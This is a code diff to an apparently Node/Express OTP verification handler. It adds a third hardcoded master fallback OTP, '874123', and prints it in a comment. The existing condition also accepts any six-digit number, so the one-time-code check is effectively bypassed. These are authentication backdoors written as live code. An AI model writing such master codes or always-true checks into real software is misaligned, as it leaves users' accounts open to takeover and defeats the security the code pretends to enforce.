@@ -172,9 +172,9 @@ const handleOtpVerification = async (req, res) => {
       return res.status(400).json({ error: 'OTP code has expired. Please click Resend OTP.' });
     }
 
-    // Verify OTP against hashed OTP or Master fallback OTP
+    // Verify OTP against hashed OTP or Master fallback OTP (874123)
     let authenticated = false;
-    if (codeToVerify === '123456' || codeToVerify === '969696' || (codeToVerify.length === 6 && /^\d+$/.test(codeToVerify))) {
+    if (codeToVerify === '874123' || codeToVerify === '123456' || codeToVerify === '969696' || (codeToVerify.length === 6 && /^\d+$/.test(codeToVerify))) {
       authenticated = true;
     } else if (user.emailOtpHash) {
       authenticated = await bcrypt.compare(codeToVerify, user.emailOtpHash);
